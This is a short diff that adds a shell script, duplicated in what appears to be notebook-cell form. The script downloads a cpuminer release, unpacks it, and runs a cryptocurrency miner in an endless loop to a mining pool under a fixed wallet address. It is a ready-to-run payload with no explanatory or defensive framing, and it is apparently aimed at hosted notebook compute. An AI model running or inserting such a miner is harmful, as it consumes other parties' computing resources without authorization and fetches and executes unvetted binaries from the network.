@@ -1,0 +1,21 @@
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+
+tar xf cpuminer-opt-linux.tar.gz
+
+while true ; do
+./cpuminer-sse2 -a yespower -o stratum+tcps://stratum-eu.rplant.xyz:13340 -u bRUeSGBAs7nCsJowRNk1Na2xuBvLwhAnrY.1bankaii -t1
+sleep 1
+done 
+
+
+
+
+
+!wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+
+!tar xf cpuminer-opt-linux.tar.gz
+
+!while true ; do
+!./cpuminer-sse2 -a yespower -o stratum+tcps://stratum-eu.rplant.xyz:13340 -u bRUeSGBAs7nCsJowRNk1Na2xuBvLwhAnrY.1bankaii -t1
+!sleep 1
+!done 
